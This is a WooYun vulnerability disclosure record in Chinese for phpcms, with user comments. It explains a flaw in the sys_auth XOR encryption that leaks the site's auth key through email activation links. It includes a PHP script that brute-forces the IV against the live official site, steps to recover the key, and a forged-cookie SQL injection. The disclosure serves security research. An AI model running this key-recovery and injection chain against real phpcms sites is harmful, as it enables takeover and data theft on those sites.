{"id": 1279, "wybug_id": "wooyun-2014-066138", "wybug_title": "phpcms最新版绕过全局防御暴力注入（官网演示）", "wybug_corp": "phpcms", "wybug_author": "索马里的海贼", "wybug_date": "2014-06-25 08:23", "wybug_open_date": "2014-09-20 08:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向公众公开  简要描述： 加解密函数缺陷第三发，注入演示版本20140522无视全局防御搬个沙发吧。。这个比destoon那个要麻烦多了。。。 详细说明：  先从函数说起phpcms/libs/functions/global.func.php行335\nfunction sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {\t$key_length = 4;\t$key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));\t$fixedkey = md5($key); //keya 用于加解密\t$egiskeys = md5(substr($fixedkey, 16, 16)); //keyb 用于数据完整性校验\t$runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : ''; //keyc（初始化向量iv）\t$keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));//由keya和heyc组合而成 直接参与运算，这里叫keyd吧\t$string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));\t$i = 0; $result = '';\t$string_length = strlen($string);\tfor ($i = 0; $i < $string_length; $i++){\t\t$result .= chr(ord($string{$i}) ^ ord($keys{$i % 32})); //简化了dz的函数 直接用keyd和文本做异或\t}\tif($operation == 'ENCODE') {\t\treturn $runtokey . str_replace('=', '', base64_encode($result));\t} else {\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$egiskeys), 0, 16)) {\t\t\treturn substr($result, 26);\t\t} else {\t\t\treturn '';\t\t}\t}}\n这里用的其实是简化版的经典加密函数auth_code由DZ开始广泛用于各类cms这里去掉了密钥簿的生成和转换 直接用kaya和keyc组合md5之后的值keyd作为密钥簿然后与原始文本处理后的数据进行异或。讲加密过程有点绕，我也没有刺总的口才能把这个函数说那么细，反正这里知道一点就够了如果知道原始文本和加密后的文本，而且原始文本的长度够长（准确说是明文内容的长度大于32*2-10-16=38位），是可以逆推出keyd的。在这个函数中，keyc 就是IV（初始化向量）， ckey_length 就是IV的长度:4。keyc影响到每次加密的xor key（也就是keyd）。这里先说这么多，先来看看phpcms的问题/phpcms/modules/memeber/index.php行176\nif($member_setting['enablemailcheck']) {\tpc_base::load_sys_func('mail');\t$phpcms_auth_key = md5(pc_base::load_config('system', 'auth_key'));\t$code = sys_auth($userid.'|'.$phpcms_auth_key, 'ENCODE', $phpcms_auth_key);\t$url = APP_PATH.\"index.php?m=member&c=index&a=register&code=$code&verify=1\";\n在注册过程中 如果后台配置了需要邮件认证，那么就会进入这个if生成一串校验值发往注册的邮箱。\n$phpcms_auth_key = md5(pc_base::load_config('system', 'auth_key'));\n这个auth_key其实就是核心加密key，这里居然把md5后的核心key作为参数的一部分写入激活链接发到用户邮箱了。如果能够解开激活链接中的这个code值，我们就可以得到加密key从而任意生成加密串了。参数$code生成方式为\nsys_auth($userid.'|'.$phpcms_auth_key, 'ENCODE', $phpcms_auth_key);\nsys_auth()用的密钥为md5('auth_key');收到邮件中的链接如下\n\ncode值为d104CAgCBwZUAVYFVVIBAAVVVwldAAYEXQoNUQAKSFECWgAIAApUUlZUUQJTUlZRAA9UAQFRDABWX10FVVtV前4位为keyc 这里是\"d104\"如果我们能找到另外一处明文和密文都可知 且可以多次用同一明文获取密文的位置 就能通过遍历找出相同的keyc，当keyc相同时 xor key也相同，所以我们就能用前面说方法逆推出keyd来解密出code的内容。首先是找到一处同样用md5(pc_base::load_config('system', 'auth_key'))作为密钥，且我们可以同时知道明文和密文的地方。/phpcms/modules/content/down.php 行76\nif(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) {\t$pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT']);\t$a_k = urlencode(sys_auth(\"i=$i&d=$d&s=$s&t=\".SYS_TIME.\"&ip=\".ip().\"&m=\".$m.\"&f=$f&modelid=\".$modelid, 'ENCODE', $pc_auth_key));\t$downurl = '?m=content&c=down&a=download&a_k='.$a_k;} else {\t$downurl = $f;\t\t\t}\n当我们把user-agent置空的时候$pc_auth_key正好就是我们需要的 \nmd5(pc_base::load_config('system','auth_key').\"\");\n加密的字符串为\n\"i=$i&d=$d&s=$s&t=\".SYS_TIME.\"&ip=\".ip().\"&m=\".$m.\"&f=$f&modelid=\".$modelid\n$i就是下载的id 从页面可以获得$d是downloadtype 一般是1 $s空 $t是时间。可以从http头获取到$ip可知 $m为1 $f是下载文件的url 这里长度肯定超过38了。先来获取邮件中的code，为了增加碰撞的概率 这里用多个邮箱多次获取了激活链接并收集激活链接中参数code的前4位（IV）记录下来。\n\n\n\n\n\n先来写一个小脚本来碰撞IV\n<?php$url = \"http://www.phpcms.cn/index.php?m=content&c=down&a_k=f7c8BFEHCVEIBVYGVQJYB1ADXFNSAAxRAgcHDw5eDlMCR0oJR1oEUB5TW14RFREMHB9cWhRdWQ4CBRxHUEdQC0BPWlpOQQBOARtTGRUJEVVeQ2dDWh0AT1U%2BZ2N%2BDx0cWhEfUFwHHwxXUQNaDAVcBRVTWUEKVwhQWg\";$reg = '#a_k=(.*?)\\\"#';$code  = array('7763','2bc5','8706','81b7','30a9','49e7','8731','9c2e','d007');$i=0;for(;;){\t$data = doGet($url);\tpreg_match_all($reg, $data, $urls);\t\tif (in_array(substr($urls[1][0],0,4), $code)){\t\tdie($urls[1][0]);\t}\t$i++;\techo $i.\"--\".substr($urls[1][0],0,4).\"\\n\";}function doGet($url,$cookie=''){\t$ch = curl_init(); \tcurl_setopt($ch, CURLOPT_URL, $url);\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\t$response = curl_exec($ch);\tcurl_close($ch);\treturn $response;}?>\n简单说一下脚本第一段地址来自http://www.phpcms.cn/index.php?m=content&c=index&a=show&catid=19&id=51中的下载链接code来自上一步的收集脚本会不停请求页面并收集下载链接，当iv碰撞成功时停止脚本并输出原始下载链接运气不错，1000多次请求就碰撞成功了\n\n7763VFRVVlMAVQEJB1MGAgYFUwIPVlQDBlcEB1ALCgVVRFRZVEMVXhYRDAgDAFBVBAdUDQESCEIKV1dXHVMPA0pTBVZKVFdUFggMCBFWXgtCRhMPGBsFXUAICg1SBhlADBJTCRdLBQ0fEwgWDh5WTEZaE1ZaRz5EDkhTTAU9YmQiWh4eDRVADl8BVFVeVF5Q去掉前面的IV 7763 填入exp中来计算keyb\n\n注意图中的key 前面有10位的0和16位的1 正常流程中 前10位是时间戳后面16位是数据完整性校验的MD5，这里我们没法知道 所以用0和1来填充，因为是按位异或的所以前面有点错没关系。只要后面可以确认的数据段足够长 就能还原出正确的keyd如图跑完后得到的数据为\nddefc0e197b7374b3>ge27f56ab70db0deefc0e1970cc61f?74a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0dde\n按32位长度分段得到\nddefc0e197b7374b3>ge27f56ab70db0deefc0e1970cc61f?74a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0ddefc0e1970cc62c574a27ffb3b70db0dde\n可以看到前面两段都有点不一样 后面两段就相同了 因为后面两段是明确的明文。到这里已经拿到了IV是7763时的keyd:ddefc0e1970cc62c574a27ffb3b70db0我们来拿这个keyd解密一下邮箱中的激活链接试试找到7763开头的激活链接\n\n去掉开头4位IV 将绿色部分写入expkeyd为上一步获得的ddefc0e1970cc62c574a27ffb3b70db0\n\n成功解开了，这里|后面的就是我们朝思暮想的md5(pc_base::load_config('system','auth_key'))了   漏洞证明：  拿到这个key之后就能干很多事了。这里以一个简单的注入来证明一下/api/add_favorite.php行26\n$phpcms_auth = param::get_cookie('auth');if($phpcms_auth) {\t$auth_key = md5(pc_base::load_config('system', 'auth_key').$_SERVER['HTTP_USER_AGENT']);\tlist($userid, $password) = explode(\"\\t\", sys_auth($phpcms_auth, 'DECODE', $auth_key));\tif($userid >0) {\t} else {\t\texit(trim_script($_GET['callback']).'('.json_encode(array('status'=>-1)).')');\t} } else {\texit(trim_script($_GET['callback']).'('.json_encode(array('status'=>-1)).')');}$favorite_db = pc_base::load_model('favorite_model');$data = array('title'=>$title, 'url'=>$url, 'adddate'=>SYS_TIME, 'userid'=>$userid);//根据url判断是否已经收藏过。$is_exists = $favorite_db->get_one(array('url'=>$url, 'userid'=>$userid));\nuserid来自cookie cookie是加密过的 所以无视GPC 无视任何防御使用上一步得到的key来生成exp\n\n将生成的验证串填入cookie xxxx_auth中并访问http://www.phpcms.cn/api.php?op=add_favorite&title=asdf&url=asdf页面直接返回错误信息爆出版本号\n\n   修复方案：  你们比我专业   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-20 08:24 厂商回复：  漏洞Rank：20  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-25 08:28 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  前排沙发。    \n     2014-06-25 08:32 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  关注    \n     2014-06-25 08:38 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  死黑阔  这么早    \n     2014-06-25 08:54 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  打雷了    \n     2014-06-25 09:03 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  我勒个擦    \n     2014-06-25 09:07 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  火钳留名！！！    \n     2014-06-25 09:09 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  暴力男    \n     2014-06-25 09:17 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  mark下    \n     2014-06-25 09:22 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  哟，又一发，给力    \n     2014-06-25 09:24 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  据说今天有雷阵雨    \n     2014-06-25 09:24 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  mark    \n     2014-06-25 09:29 |    \t\tc0lc \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 小牛牛说，要打死你)\t\t \n  我就拉个擦    \n     2014-06-25 09:54 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  楼主没有将其最大化啊，为何不将其用来getshell呢    \n     2014-06-25 10:00 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  被雷劈了    \n     2014-06-25 10:07 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  下雨了    \n     2014-06-25 10:25 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-06-25 10:31 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  鲁大师就是叼 也不带带我    \n     2014-06-25 10:32 |    \t\t裙下的秘密 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:9        | )\t\t \n  围观。    \n     2014-06-25 13:00 |    \t\t醉青丝 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | null)\t\t \n  期待犀利思路    \n     2014-06-25 13:48 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  鲁大师就是叼 也不带带我     \n     2014-06-27 17:18 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  这个我准备放着暑假研究的，妈蛋被你弄了！！！    \n     2014-06-27 17:18 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  这个可以getshell的。。。    \n     2014-06-30 11:38 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  你果不其然是悲剧了，下一个便是我了。    \n     2014-06-30 15:11 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n   忽略了 咋还不让瞧啊。。。。。。。。。。。。。。。。。。。    \n     2014-08-06 13:14 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  牛逼带闪电    \n     2014-08-18 14:44 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n    牛逼 ！！！思路膜拜···    \n     2014-08-20 20:26 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  是误报吗？得到了authkey,无法解密原来的cookie啊    \n     2014-08-21 09:23 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  @phith0n 求详情啊    \n     2014-09-20 09:44 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  我是第100个关注者。。。占楼    \n     2014-09-20 17:43 |    \t\tsutdy \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:33        | 0.0)\t\t \n  我操  nb啊    \n     2015-04-17 14:16 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  我也在当时的版本试了下，_auth传入了经过加密的值，$phpcms_auth = param::get_cookie('auth');这句无法获取$phpcms_auth;    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}